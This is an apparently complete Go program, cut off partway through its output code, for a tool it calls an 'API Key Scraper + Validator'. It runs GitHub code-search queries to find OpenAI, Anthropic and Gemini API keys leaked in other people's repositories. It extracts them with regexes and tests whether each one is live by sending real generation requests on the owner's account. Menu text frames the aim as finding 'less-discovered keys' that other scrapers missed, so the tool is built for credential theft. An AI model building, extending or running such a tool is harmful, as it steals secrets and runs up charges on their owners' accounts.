package main

import (
        "bufio"
        "bytes"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "net/url"
        "os"
        "os/signal"
        "path/filepath"
        "regexp"
        "strconv"
        "strings"
        "sync"
        "sync/atomic"
        "syscall"
        "time"

        "github.com/fatih/color"
        "github.com/schollz/progressbar/v3"
)

// ═══════════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════════

const envKeyFile    = ".env-git-keys"
const seenFile      = "keychk_seen.txt"
const lastRunFile   = "keychk_lastrun.txt"
const searchDelayMs = 7000 // ms between code-search queries (10 req/min limit)

// ═══════════════════════════════════════════════════════════════════════════
// Key patterns
// ═══════════════════════════════════════════════════════════════════════════

var patterns = map[string]*regexp.Regexp{
        "openai": regexp.MustCompile(
                `sk-(?:proj-|svcacct-)?[A-Za-z0-9_\-]{40,120}` +
                        `|sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}`,
        ),
        "anthropic": regexp.MustCompile(
                `sk-ant-(?:api\d+-)?[A-Za-z0-9_\-]{86,}` +
                        `|sk-ant-[A-Za-z0-9_\-]{30,100}`,
        ),
        "gemini": regexp.MustCompile(
                `AIza[A-Za-z0-9_\-]{35}`,
        ),
}

var searchQueries = map[string][]string{
        "openai": {
                `"OPENAI_API_KEY" sk-`,
                `"openai" "sk-proj-"`,
                `openai sk- language:python`,
                `openai sk- language:javascript`,
                `"api_key" "sk-" openai`,
                `sk-proj- filename:.env`,
                `sk-proj- filename:config.py`,
                `"OPENAI_API_KEY" filename:.env`,
                `openai_api_key sk- language:go`,
                `"sk-" "openai" filename:key.txt`,
        },
        "anthropic": {
                `"ANTHROPIC_API_KEY" sk-ant-`,
                `"sk-ant-" anthropic`,
                `anthropic "sk-ant-api" language:python`,
                `claude "sk-ant-" language:javascript`,
                `"api_key" "sk-ant-" anthropic`,
                `sk-ant- filename:.env`,
                `"ANTHROPIC_API_KEY" filename:config`,
                `sk-ant-api language:python`,
        },
        "gemini": {
                `"GOOGLE_API_KEY" AIza`,
                `"AIza" gemini language:python`,
                `gemini "AIzaSy" language:javascript`,
                `"GEMINI_API_KEY" AIza`,
                `"google.generativeai" AIza`,
                `AIzaSy filename:.env`,
                `AIzaSy filename:app.py`,
                `"genai.configure" AIza`,
                `"google-generativeai" AIzaSy language:python`,
                `"GOOGLE_API_KEY" AIzaSy language:python`,
        },
}

var scanExts = map[string]bool{
        ".py": true, ".js": true, ".ts": true, ".jsx": true, ".tsx": true,
        ".env": true, ".config": true, ".txt": true, ".json": true,
        ".yaml": true, ".yml": true, ".ini": true, ".conf": true,
        ".sh": true, ".bash": true, ".rb": true, ".go": true,
        ".php": true, ".java": true, ".cs": true, ".toml": true,
        ".properties": true, ".cfg": true,
}

var skipPaths = []string{
        "node_modules/", "venv/", "__pycache__/", ".git/",
        "dist/", "build/", "vendor/", "target/",
}

const maxFileBytes = 500 * 1024

// ═══════════════════════════════════════════════════════════════════════════
// Colors
// ═══════════════════════════════════════════════════════════════════════════

var (
        cyan    = color.New(color.FgCyan, color.Bold)
        green   = color.New(color.FgGreen, color.Bold)
        red     = color.New(color.FgRed, color.Bold)
        yellow  = color.New(color.FgYellow, color.Bold)
        magenta = color.New(color.FgMagenta, color.Bold)
        blue    = color.New(color.FgBlue, color.Bold)
        white   = color.New(color.FgWhite, color.Bold)
        dim     = color.New(color.FgWhite)

        providerColor = map[string]*color.Color{
                "openai":    green,
                "anthropic": magenta,
                "gemini":    blue,
        }
)

func banner() {
        blue.Println()
        blue.Println("  +══════════════════════════════════════════════════════════+")
        cyan.Println("  |  ██╗  ██╗███████╗██╗   ██╗ ██████╗██╗  ██╗██╗  ██╗    |")
        cyan.Println("  |  ██║ ██╔╝██╔════╝╚██╗ ██╔╝██╔════╝██║  ██║██║ ██╔╝    |")
        cyan.Println("  |  █████╔╝ █████╗   ╚████╔╝██║     ███████║█████╔╝      |")
        cyan.Println("  |  ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██╔══██║██╔═██╗     |")
        cyan.Println("  |  ██║  ██╗███████╗   ██║   ╚██████╗██║  ██║██║  ██╗    |")
        cyan.Println("  |  ╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   |")
        blue.Println("  |                                                          |")
        white.Println("  |  API Key Scraper + Validator   no credits · no service  |")
        blue.Println("  +══════════════════════════════════════════════════════════+")
        dim.Println("  " + strings.Repeat("─", 62))
        fmt.Println()
}

func info(msg string)    { cyan.Print("  [*] "); fmt.Println(msg) }
func success(msg string) { green.Print("  [+] "); green.Println(msg) }
func warn(msg string)    { yellow.Print("  [!] "); yellow.Println(msg) }
func fail(msg string)    { red.Print("  [-] "); red.Println(msg) }
func divider()           { dim.Println("  " + strings.Repeat("─", 62)) }

// ═══════════════════════════════════════════════════════════════════════════
// .env-git-keys file — token persistence
// ═══════════════════════════════════════════════════════════════════════════

// loadEnvKeyFile reads GitHub tokens from .env-git-keys.
// Supports these line formats:
//   ghp_actualtoken
//   GITHUB_TOKEN=ghp_actualtoken
//   # comment lines are ignored
func loadEnvKeyFile(path string) []string {
        data, err := os.ReadFile(path)
        if err != nil {
                return nil
        }
        var tokens []string
        for _, line := range strings.Split(string(data), "\n") {
                line = strings.TrimSpace(line)
                if line == "" || strings.HasPrefix(line, "#") {
                        continue
                }
                if idx := strings.Index(line, "="); idx != -1 {
                        line = strings.TrimSpace(line[idx+1:])
                }
                line = strings.Trim(line, `"'`)
                if line != "" {
                        tokens = append(tokens, line)
                }
        }
        return tokens
}

// appendEnvKeyFile saves a new token to .env-git-keys, avoiding duplicates.
func appendEnvKeyFile(path, token string) error {
        existing := loadEnvKeyFile(path)
        for _, t := range existing {
                if t == token {
                        return nil // already present
                }
        }
        f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
        if err != nil {
                return err
        }
        defer f.Close()
        _, err = fmt.Fprintf(f, "GITHUB_TOKEN=%s\n", token)
        return err
}

// removeEnvKeyFile removes a token from .env-git-keys by index (0-based).
func removeEnvKeyFile(path string, idx int) error {
        existing := loadEnvKeyFile(path)
        if idx < 0 || idx >= len(existing) {
                return fmt.Errorf("index out of range")
        }
        existing = append(existing[:idx], existing[idx+1:]...)
        f, err := os.Create(path)
        if err != nil {
                return err
        }
        defer f.Close()
        w := bufio.NewWriter(f)
        for _, t := range existing {
                fmt.Fprintf(w, "GITHUB_TOKEN=%s\n", t)
        }
        return w.Flush()
}

// maskToken shows the first 8 and last 4 characters.
func maskToken(t string) string {
        if len(t) <= 12 {
                return strings.Repeat("*", len(t))
        }
        return t[:8] + strings.Repeat("*", len(t)-12) + t[len(t)-4:]
}

// ═══════════════════════════════════════════════════════════════════════════
// Config — all run-time settings in one place
// ═══════════════════════════════════════════════════════════════════════════

type Config struct {
        GHTokens  []string // GitHub PATs
        Providers []string // openai, anthropic, gemini
        Pages     int      // search pages per query
        PageStart int      // first page to fetch (default 1; set >1 to skip burned pages)
        Workers   int      // concurrent goroutines
        Validate  bool     // live-validate found keys
        OutDir    string   // output directory
        CacheFile     string   // seen-keys flat file
        FreshnessDays int      // 0=disabled; N=skip repos not pushed in last N days
}

func defaultConfig() *Config {
        return &Config{
                Providers: []string{"openai", "anthropic", "gemini"},
                Pages:     5,
                PageStart: 1,
                Workers:   10,
                Validate:  false,
                OutDir:    ".",
                CacheFile: seenFile,
        }
}

// ═══════════════════════════════════════════════════════════════════════════
// Interactive menu
// ═══════════════════════════════════════════════════════════════════════════

var stdin = bufio.NewReader(os.Stdin)

func readLine(prompt string) string {
        fmt.Print(prompt)
        line, _ := stdin.ReadString('\n')
        return strings.TrimSpace(line)
}

func boolStr(b bool) string {
        if b {
                return green.Sprint("yes")
        }
        return dim.Sprint("no")
}

func menuHeader(cfg *Config) {
        tokenStat := red.Sprint("none loaded")
        if n := len(cfg.GHTokens); n > 0 {
                tokenStat = green.Sprintf("%d token(s) loaded", n)
        }

        fmt.Println()
        blue.Println("  ╔══════════════════════════════════════════════════════════╗")
        blue.Print("  ║  "); white.Print("CONFIGURATION"); blue.Println("                                           ║")
        blue.Println("  ╠══════════════════════════════════════════════════════════╣")

        row := func(num, label, val string) {
                line := fmt.Sprintf("  ║  %s  %-18s %s",
                        cyan.Sprintf("[%s]", num),
                        white.Sprint(label),
                        val,
                )
                // pad to fixed width
                visible := stripANSI(line)
                pad := 64 - len(visible)
                if pad < 0 {
                        pad = 0
                }
                fmt.Print(line + strings.Repeat(" ", pad))
                blue.Println("║")
        }

        row("1", "Providers", cyan.Sprint(strings.Join(cfg.Providers, ", ")))
        row("2", "Pages / query", cyan.Sprintf("%d  (pages %d-%d)", cfg.Pages, cfg.PageStart, cfg.PageStart+cfg.Pages-1))
        row("3", "Workers", cyan.Sprintf("%d", cfg.Workers))
        row("4", "Validate keys", boolStr(cfg.Validate))
        row("5", "Output dir", cyan.Sprint(cfg.OutDir))
        row("6", "Cache file", dim.Sprint(cfg.CacheFile))
        var freshnessVal string
        if cfg.FreshnessDays > 0 {
                freshnessVal = cyan.Sprintf("commits within %dd (from %s)", cfg.FreshnessDays,
                        time.Now().UTC().Add(-time.Duration(cfg.FreshnessDays)*24*time.Hour).Format("2006-01-02"))
        } else {
                freshnessVal = dim.Sprint("off  (all repos, recommended)")
        }
        row("P", "Page start", cyan.Sprintf("%d  (skip first %d page(s) of results)", cfg.PageStart, cfg.PageStart-1))
        row("F", "Freshness filter", freshnessVal)

        blue.Println("  ╠══════════════════════════════════════════════════════════╣")
        blue.Print("  ║  "); white.Print("GITHUB TOKENS"); dim.Print("  "); fmt.Print(tokenStat)

        visibleHeader := "  ║  GITHUB TOKENS  " + stripANSI(tokenStat)
        pad := 64 - len(visibleHeader)
        if pad < 0 {
                pad = 0
        }
        fmt.Print(strings.Repeat(" ", pad))
        blue.Println("║")

        blue.Println("  ╠══════════════════════════════════════════════════════════╣")

        row("7", "Add token", dim.Sprint("type/paste a GitHub PAT"))
        row("8", "View tokens", dim.Sprint("show loaded tokens (masked)"))
        row("9", "Remove token", dim.Sprint("remove a token by number"))
        row("T", "Test a token", dim.Sprint("verify a token hits GitHub API"))

        blue.Println("  ╠══════════════════════════════════════════════════════════╣")

        row("C", "Clear seen cache", dim.Sprint("re-scan all keys next run"))
        row("R", "Run scan", green.Sprint("start scanning now"))
        row("Q", "Quit", "")

        blue.Println("  ╚══════════════════════════════════════════════════════════╝")
        fmt.Println()
}

// stripANSI removes ANSI escape codes to get printable length.
var ansiRe = regexp.MustCompile(`\x1b\[[0-9;]*m`)

func stripANSI(s string) string {
        return ansiRe.ReplaceAllString(s, "")
}

func runMenu(cfg *Config) {
        for {
                banner()
                menuHeader(cfg)

                choice := strings.ToUpper(readLine(cyan.Sprint("  > ")))
                fmt.Println()

                switch choice {
                // ── 1: Providers ─────────────────────────────────────────────────
                case "1":
                        white.Println("  Available: openai, anthropic, gemini")
                        raw := readLine(cyan.Sprint("  Enter comma-separated providers: "))
                        var list []string
                        for _, p := range strings.Split(raw, ",") {
                                p = strings.TrimSpace(strings.ToLower(p))
                                if _, ok := patterns[p]; ok {
                                        list = append(list, p)
                                } else if p != "" {
                                        warn("Unknown provider: " + p + " — skipped")
                                }
                        }
                        if len(list) > 0 {
                                cfg.Providers = list
                                success("Providers set to: " + strings.Join(list, ", "))
                        } else {
                                warn("No valid providers entered — keeping current.")
                        }

                // ── 2: Pages ──────────────────────────────────────────────────────
                case "2":
                        raw := readLine(cyan.Sprintf("  Pages per query [current: %d]: ", cfg.Pages))
                        if n, err := strconv.Atoi(raw); err == nil && n > 0 {
                                cfg.Pages = n
                                success(fmt.Sprintf("Pages set to %d", n))
                        } else {
                                warn("Invalid number — keeping current.")
                        }

                // ── 3: Workers ───────────────────────────────────────────────────
                case "3":
                        raw := readLine(cyan.Sprintf("  Workers [current: %d]: ", cfg.Workers))
                        if n, err := strconv.Atoi(raw); err == nil && n > 0 {
                                cfg.Workers = n
                                success(fmt.Sprintf("Workers set to %d", n))
                        } else {
                                warn("Invalid number — keeping current.")
                        }

                // ── 4: Validate ──────────────────────────────────────────────────
                case "4":
                        raw := strings.ToLower(readLine(cyan.Sprint("  Validate keys? (y/n): ")))
                        cfg.Validate = raw == "y" || raw == "yes"
                        success(fmt.Sprintf("Validate set to %v", cfg.Validate))

                // ── 5: Output dir ────────────────────────────────────────────────
                case "5":
                        raw := readLine(cyan.Sprintf("  Output dir [current: %s]: ", cfg.OutDir))
                        if raw != "" {
                                cfg.OutDir = raw
                                success("Output dir set to: " + raw)
                        }

                // ── 6: Cache file ────────────────────────────────────────────────
                case "6":
                        raw := readLine(cyan.Sprintf("  Cache file [current: %s]: ", cfg.CacheFile))
                        if raw != "" {
                                cfg.CacheFile = raw
                                success("Cache file set to: " + raw)
                        }

                // ── P: Page start ────────────────────────────────────────────────
                case "P":
                        white.Println("  Set which GitHub search page to start from.")
                        white.Println("  Page 1 results are the most indexed and burned by other scrapers.")
                        white.Println("  Use page 3-5 to find fresher, less-discovered keys.")
                        raw := readLine(cyan.Sprintf("  Page start [current: %d]: ", cfg.PageStart))
                        if n, err := strconv.Atoi(strings.TrimSpace(raw)); err == nil && n >= 1 {
                                cfg.PageStart = n
                                success(fmt.Sprintf("Page start set to %d (fetches pages %d-%d)", n, n, n+cfg.Pages-1))
                        } else {
                                warn("Invalid number — must be ≥1. Keeping current.")
                        }

                // ── F: Freshness filter ───────────────────────────────────────────
                case "F":
                        white.Println("  Only scan repos pushed within N days.")
                        white.Println("  Enter 0 to disable (scan all repos — recommended,")
                        white.Println("  since live keys often live in old abandoned repos).")
                        raw := readLine(cyan.Sprintf("  Days [current: %d, 0=off]: ", cfg.FreshnessDays))
                        if n, err := strconv.Atoi(strings.TrimSpace(raw)); err == nil && n >= 0 {
                                cfg.FreshnessDays = n
                                if n == 0 {
                                        success("Freshness filter disabled — all repos will be scanned")
                                } else {
                                        success(fmt.Sprintf("Freshness filter set to %d day(s)", n))
                                }
                        } else {
                                warn("Invalid number — keeping current.")
                        }

                // ── 7: Add token ─────────────────────────────────────────────────
                case "7":
                        white.Println("  Paste your GitHub PAT (starts with ghp_, gho_, github_pat_…)")
                        white.Println("  Token will be saved to " + envKeyFile + " for future runs.")
                        tok := readLine(cyan.Sprint("  Token: "))
                        if tok == "" {
                                warn("Empty input — nothing saved.")
                                break
                        }
                        // Deduplicate in memory
                        already := false
                        for _, t := range cfg.GHTokens {
                                if t == tok {
                                        already = true
                                        break
                                }
                        }
                        if !already {
                                cfg.GHTokens = append(cfg.GHTokens, tok)
                        }
                        if err := appendEnvKeyFile(envKeyFile, tok); err != nil {
                                fail("Could not save to " + envKeyFile + ": " + err.Error())
                        } else {
                                success(fmt.Sprintf("Token saved to %s  (%d total in memory)", envKeyFile, len(cfg.GHTokens)))
                        }

                // ── 8: View tokens ───────────────────────────────────────────────
                case "8":
                        if len(cfg.GHTokens) == 0 {
                                warn("No tokens loaded. Add one with option [7].")
                        } else {
                                white.Printf("  %d token(s) loaded:\n\n", len(cfg.GHTokens))
                                for i, t := range cfg.GHTokens {
                                        fmt.Printf("    %s  %s\n",
                                                cyan.Sprintf("[%d]", i+1),
                                                dim.Sprint(maskToken(t)),
                                        )
                                }
                        }
                        fmt.Println()
                        readLine(dim.Sprint("  Press Enter to continue…"))

                // ── 9: Remove token ──────────────────────────────────────────────
                case "9":
                        if len(cfg.GHTokens) == 0 {
                                warn("No tokens loaded.")
                                break
                        }
                        white.Printf("  %d token(s) loaded:\n\n", len(cfg.GHTokens))
                        for i, t := range cfg.GHTokens {
                                fmt.Printf("    %s  %s\n",
                                        cyan.Sprintf("[%d]", i+1),
                                        dim.Sprint(maskToken(t)),
                                )
                        }
                        fmt.Println()
                        raw := readLine(cyan.Sprint("  Enter number to remove (or Enter to cancel): "))
                        if raw == "" {
                                break
                        }
                        n, err := strconv.Atoi(raw)
                        if err != nil || n < 1 || n > len(cfg.GHTokens) {
                                warn("Invalid number.")
                                break
                        }
                        removed := cfg.GHTokens[n-1]
                        cfg.GHTokens = append(cfg.GHTokens[:n-1], cfg.GHTokens[n:]...)
                        if rerr := removeEnvKeyFile(envKeyFile, n-1); rerr != nil {
                                warn("Removed from memory but could not update file: " + rerr.Error())
                        } else {
                                success("Removed " + maskToken(removed) + " from memory and " + envKeyFile)
                        }

                // ── T: Test token ─────────────────────────────────────────────────
                case "T":
                        white.Println("  Enter the token to test (or a number from the list):")
                        for i, t := range cfg.GHTokens {
                                fmt.Printf("    %s  %s\n", cyan.Sprintf("[%d]", i+1), dim.Sprint(maskToken(t)))
                        }
                        fmt.Println()
                        raw := readLine(cyan.Sprint("  Token or number: "))
                        tok := raw
                        if n, err := strconv.Atoi(raw); err == nil && n >= 1 && n <= len(cfg.GHTokens) {
                                tok = cfg.GHTokens[n-1]
                        }
                        if tok == "" {
                                warn("Nothing to test.")
                                break
                        }
                        info("Testing token against GitHub API…")
                        body, status, err := ghGet("/rate_limit", nil, tok)
                        if err != nil {
                                fail("Request failed: " + err.Error())
                        } else if status == 200 {
                                var rl struct {
                                        Rate struct {
                                                Limit     int `json:"limit"`
                                                Remaining int `json:"remaining"`
                                                Reset     int `json:"reset"`
                                        } `json:"rate"`
                                }
                                _ = json.Unmarshal(body, &rl)
                                success(fmt.Sprintf("Token valid!  Rate limit: %d/%d  resets %s",
                                        rl.Rate.Remaining, rl.Rate.Limit,
                                        time.Unix(int64(rl.Rate.Reset), 0).Format("15:04:05"),
                                ))
                        } else {
                                fail(fmt.Sprintf("Token rejected by GitHub (HTTP %d)", status))
                        }
                        fmt.Println()
                        readLine(dim.Sprint("  Press Enter to continue…"))

                // ── C: Clear cache ────────────────────────────────────────────────
                case "C":
                        if cfg.CacheFile == "" {
                                warn("No cache file configured.")
                                break
                        }
                        conf := readLine(yellow.Sprintf("  Delete %s? All seen keys will be rescanned. (y/n): ", cfg.CacheFile))
                        if strings.ToLower(conf) == "y" {
                                if err := os.Remove(cfg.CacheFile); err != nil && !os.IsNotExist(err) {
                                        fail("Could not delete cache: " + err.Error())
                                } else {
                                        success("Cache cleared.")
                                }
                        }

                // ── R: Run ────────────────────────────────────────────────────────
                case "R":
                        if len(cfg.GHTokens) == 0 {
                                warn("No GitHub tokens — scan will be severely rate-limited.")
                                conf := readLine(yellow.Sprint("  Continue without a token? (y/n): "))
                                if strings.ToLower(conf) != "y" {
                                        break
                                }
                        }
                        runScan(cfg)
                        fmt.Println()
                        readLine(dim.Sprint("  Scan complete. Press Enter to return to menu…"))

                // ── Q: Quit ──────────────────────────────────────────────────────
                case "Q", "":
                        fmt.Println()
                        dim.Println("  Goodbye.")
                        fmt.Println()
                        os.Exit(0)

                default:
                        warn("Unknown option: " + choice)
                }

                fmt.Println()
                time.Sleep(200 * time.Millisecond)
        }
}

// ═══════════════════════════════════════════════════════════════════════════
// Last-run timestamp — used as pushed:> filter so each run only sees new repos
// ═══════════════════════════════════════════════════════════════════════════

// loadLastRun reads the saved timestamp from the previous run.
// Falls back to 72 hours ago if the file doesn't exist (first run).
func loadLastRun(path string) time.Time {
        data, err := os.ReadFile(path)
        if err != nil {
                return time.Now().UTC().Add(-72 * time.Hour)
        }
        t, err := time.Parse(time.RFC3339, strings.TrimSpace(string(data)))
        if err != nil {
                return time.Now().UTC().Add(-72 * time.Hour)
        }
        return t
}

// saveLastRun writes the current time to the lastrun file.
func saveLastRun(path string, t time.Time) {
        _ = os.WriteFile(path, []byte(t.UTC().Format(time.RFC3339)), 0644)
}

// ═══════════════════════════════════════════════════════════════════════════
// Seen-key dedup (in-memory + flat file)
// ═══════════════════════════════════════════════════════════════════════════

type SeenSet struct {
        mu   sync.Mutex
        keys map[string]bool
        file *os.File
}

func newSeenSet(path string) *SeenSet {
        s := &SeenSet{keys: make(map[string]bool)}
        if data, err := os.ReadFile(path); err == nil {
                for _, line := range strings.Split(string(data), "\n") {
                        if line = strings.TrimSpace(line); line != "" {
                                s.keys[line] = true
                        }
                }
        }
        f, _ := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        s.file = f
        return s
}

func (s *SeenSet) seen(key string) bool {
        s.mu.Lock()
        defer s.mu.Unlock()
        return s.keys[key]
}

func (s *SeenSet) add(key string) {
        s.mu.Lock()
        defer s.mu.Unlock()
        if !s.keys[key] {
                s.keys[key] = true
                if s.file != nil {
                        _, _ = fmt.Fprintln(s.file, key)
                }
        }
}

func (s *SeenSet) close() {
        if s.file != nil {
                _ = s.file.Close()
        }
}

// ═══════════════════════════════════════════════════════════════════════════
// Token rotator
// ═══════════════════════════════════════════════════════════════════════════

type Tokens struct {
        mu   sync.Mutex
        list []string
        idx  int
}

func (t *Tokens) next() string {
        t.mu.Lock()
        defer t.mu.Unlock()
        if len(t.list) == 0 {
                return ""
        }
        tok := t.list[t.idx%len(t.list)]
        t.idx++
        return tok
}

// ═══════════════════════════════════════════════════════════════════════════
// HTTP helpers
// ═══════════════════════════════════════════════════════════════════════════

var httpClient = &http.Client{Timeout: 15 * time.Second}

func ghGet(endpoint string, params map[string]string, tok string) ([]byte, int, error) {
        req, err := http.NewRequest("GET", "https://api.github.com"+endpoint, nil)
        if err != nil {
                return nil, 0, err
        }
        req.Header.Set("Accept", "application/vnd.github.v3+json")
        if tok != "" {
                req.Header.Set("Authorization", "token "+tok)
        }
        q := req.URL.Query()
        for k, v := range params {
                q.Set(k, v)
        }
        req.URL.RawQuery = q.Encode()
        resp, err := httpClient.Do(req)
        if err != nil {
                return nil, 0, err
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        return body, resp.StatusCode, nil
}

// ═══════════════════════════════════════════════════════════════════════════
// Key extractor
// ═══════════════════════════════════════════════════════════════════════════

var junkStrings = []string{
        "your_key", "example", "xxxxxx", "replace", "insert",
        "YOUR_", "ENTER_", "<", ">", "...", "sk-or-v1-",
}

func extractKeys(text string) map[string][]string {
        found := make(map[string][]string)
        for provider, pat := range patterns {
                for _, m := range pat.FindAllString(text, -1) {
                        m = strings.TrimSpace(m)
                        if len(m) < 20 {
                                continue
                        }
                        ml := strings.ToLower(m)
                        junk := false
                        for _, j := range junkStrings {
                                if strings.Contains(ml, strings.ToLower(j)) {
                                        junk = true
                                        break
                                }
                        }
                        if !junk {
                                found[provider] = append(found[provider], m)
                        }
                }
        }
        return found
}

func shouldScan(path string, size int) bool {
        if size > maxFileBytes {
                return false
        }
        pl := strings.ToLower(path)
        for _, skip := range skipPaths {
                if strings.Contains(pl, skip) {
                        return false
                }
        }
        ext := strings.ToLower(filepath.Ext(path))
        return scanExts[ext] || ext == ""
}

// ═══════════════════════════════════════════════════════════════════════════
// Key validator
// ═══════════════════════════════════════════════════════════════════════════

func validateKey(provider, key string) int {
        client := &http.Client{Timeout: 12 * time.Second}

        switch provider {

        // ── OpenAI ────────────────────────────────────────────────────────────
        // POST /v1/chat/completions max_tokens=1 — real request, reveals disabled orgs.
        // GET /v1/models returns 200 even for deactivated accounts.
        // 200 = LIVE. 401/402/403 = DEAD. 429 insufficient_quota = DEAD.
        // 429 rate_limit_exceeded = WARM (valid key with credits, rate-limited;
        //   OpenAI rate limits reset per minute — retry after ~60s).
        case "openai":
                payload := `{"model":"gpt-4o-mini","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
                req, _ := http.NewRequest("POST", "https://api.openai.com/v1/chat/completions",
                        strings.NewReader(payload))
                req.Header.Set("Authorization", "Bearer "+key)
                req.Header.Set("Content-Type", "application/json")
                resp, err := client.Do(req)
                if err != nil {
                        return -1
                }
                body, _ := io.ReadAll(resp.Body)
                resp.Body.Close()
                bl := strings.ToLower(string(body))
                switch resp.StatusCode {
                case 200:
                        return 1 // LIVE — generated successfully
                case 401, 402, 403:
                        return 0 // DEAD — invalid or revoked key
                case 429:
                        if strings.Contains(bl, "insufficient_quota") {
                                return 0 // DEAD — no credits
                        }
                        return 2 // WARM — rate_limit_exceeded, valid key, retry after ~60s
                case 400:
                        if strings.Contains(bl, "deactivated") || strings.Contains(bl, "disabled") {
                                return 0
                        }
                        return -1
                }
                return -1

        // ── Anthropic ─────────────────────────────────────────────────────────
        // POST /v1/messages with max_tokens=1 to minimise cost.
        // 200 = LIVE (key authenticated, account has credits, generated).
        // 429 / 529 = WARM — key is valid and has credits, but is rate-limited
        //   (Anthropic rate limits reset per minute, not daily).
        // 401 / 403 = DEAD (invalid or revoked key).
        // 400 with disabled-org or zero-credit = DEAD.
        // Other 400 = UNKNOWN (bad request, not a key quality signal).
        case "anthropic":
                payload := `{"model":"claude-sonnet-4-6","messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
                req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages",
                        strings.NewReader(payload))
                req.Header.Set("x-api-key", key)
                req.Header.Set("anthropic-version", "2023-06-01")
                req.Header.Set("Content-Type", "application/json")
                resp, err := client.Do(req)
                if err != nil {
                        return -1
                }
                body, _ := io.ReadAll(resp.Body)
                resp.Body.Close()
                bl := strings.ToLower(string(body))
                switch resp.StatusCode {
                case 200:
                        return 1 // LIVE — generated successfully
                case 401, 403:
                        return 0 // DEAD — invalid or revoked key
                case 429, 529:
                        return 2 // WARM — valid key with credits, just rate-limited (~1 min reset)
                case 400:
                        if strings.Contains(bl, "organization has been disabled") ||
                                strings.Contains(bl, "credit_balance_too_low") ||
                                strings.Contains(bl, "your credit balance is too low") {
                                return 0 // DEAD — no credits or org suspended
                        }
                        return -1 // other 400 = unknown
                }
                return -1

        // ── Gemini ────────────────────────────────────────────────────────────
        // Cascading validator — tries models from newest to most permissive:
        //   1. gemini-2.5-flash  (current agent model, 250 req/day free tier)
        //   2. gemini-2.0-flash-lite (1500 req/day, harder to exhaust)
        // A 200 on ANY model = LIVE (key authenticates and can generate).
        // Only HTTP 200 counts as LIVE — 429 at test time means the key is
        // already saturated and will be unusable when the user tries it.
        // 400+api_key_invalid / 403 = DEAD (key revoked or suspended).
        case "gemini":
                geminiModels := []string{
                        "gemini-2.5-flash",
                        "gemini-2.0-flash-lite",
                }
                var lastBL string
                var lastStatus int
                for _, model := range geminiModels {
                        u := "https://generativelanguage.googleapis.com/v1beta/models/" + model + ":generateContent?key=" + url.QueryEscape(key)
                        payload := `{"contents":[{"parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":1}}`
                        req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
                        req.Header.Set("Content-Type", "application/json")
                        resp, err := client.Do(req)
                        if err != nil {
                                continue
                        }
                        body, _ := io.ReadAll(resp.Body)
                        resp.Body.Close()
                        if resp.StatusCode == 200 {
                                return 1 // generated successfully on this model — LIVE
                        }
                        lastBL = strings.ToLower(string(body))
                        lastStatus = resp.StatusCode
                        // Hard failures — no point trying other models
                        if strings.Contains(lastBL, "api_key_invalid") ||
                                strings.Contains(lastBL, "api key not valid") ||
                                strings.Contains(lastBL, "invalid api key") ||
                                lastStatus == 403 {
                                return 0
                        }
                        // 429 or other — try next model
                }
                // All models tried — none returned 200.
                if lastStatus == 403 {
                        return 0
                }
                if lastStatus == 429 {
                        // Distinguish permanently dead (zero quota) from temporarily
                        // exhausted (real quota exists but burned for today).
                        // Zero-quota patterns — permanently dead:
                        if strings.Contains(lastBL, `"quota_limit_value":"0"`) ||
                                strings.Contains(lastBL, "quota_limit_value: 0") ||
                                strings.Contains(lastBL, ", limit: 0,") ||
                                strings.Contains(lastBL, "\"limit\": 0") {
                                return 0 // DEAD — project has no quota at all
                        }
                        // Non-zero quota but burned for now — WARM.
                        // The key is valid and the project has real quota; it will
                        // reset at the Google daily reset (~midnight PT). Usable
                        // again after reset.
                        return 2
                }
                return -1
        }
        return -1
}

// ═══════════════════════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════════════════════

type Result struct {
        Key      string
        Provider string
        Platform string
        Repo     string
        File     string
        URL      string
        Valid    int
        FoundAt  time.Time
}

type ResultStore struct {
        mu      sync.Mutex
        results []Result
}

func (rs *ResultStore) add(r Result) {
        rs.mu.Lock()
        rs.results = append(rs.results, r)
        rs.mu.Unlock()
}

func (rs *ResultStore) all() []Result {
        rs.mu.Lock()
        defer rs.mu.Unlock()
        out := make([]Result, len(rs.results))
        copy(out, rs.results)
        return out
}

// ═══════════════════════════════════════════════════════════════════════════
// Print a found key live
// ═══════════════════════════════════════════════════════════════════════════

var printMu sync.Mutex

func printQuery(provider string, i, total, found int, searchStart time.Time, bar *progressbar.ProgressBar) {
        pc := providerColor[provider]
        if pc == nil {
                pc = white
        }
        done := i + 1
        remaining := total - done
        var etaStr string
        if remaining > 0 {
                elapsed := time.Since(searchStart)
                avgPerQuery := elapsed / time.Duration(done)
                eta := time.Duration(remaining) * avgPerQuery
                // round to nearest second
                eta = eta.Round(time.Second)
                etaStr = dim.Sprintf("  ~%s left in search", eta)
        } else {
                etaStr = dim.Sprint("  search done")
        }
        printMu.Lock()
        bar.Clear()
        fmt.Printf("  %s  %s  query %d/%d  →  %s%s\n",
                pc.Sprintf("%-10s", strings.ToUpper(provider)),
                dim.Sprint("◎ search"),
                done, total,
                cyan.Sprintf("%d file(s)", found),
                etaStr,
        )
        _ = bar.RenderBlank()
        printMu.Unlock()
}

func printKey(r Result, bar *progressbar.ProgressBar) {
        pc := providerColor[r.Provider]
        if pc == nil {
                pc = white
        }
        var statusStr string
        switch r.Valid {
        case 1:
                statusStr = green.Sprint("● LIVE")
        case 2:
                statusStr = yellow.Sprint("● warm")
        case 0:
                statusStr = red.Sprint("● dead")
        default:
                statusStr = dim.Sprint("● ?   ")
        }
        shortKey := r.Key
        if len(shortKey) > 28 {
                shortKey = shortKey[:28] + "…"
        }
        shortRepo := r.Repo
        if len(shortRepo) > 36 {
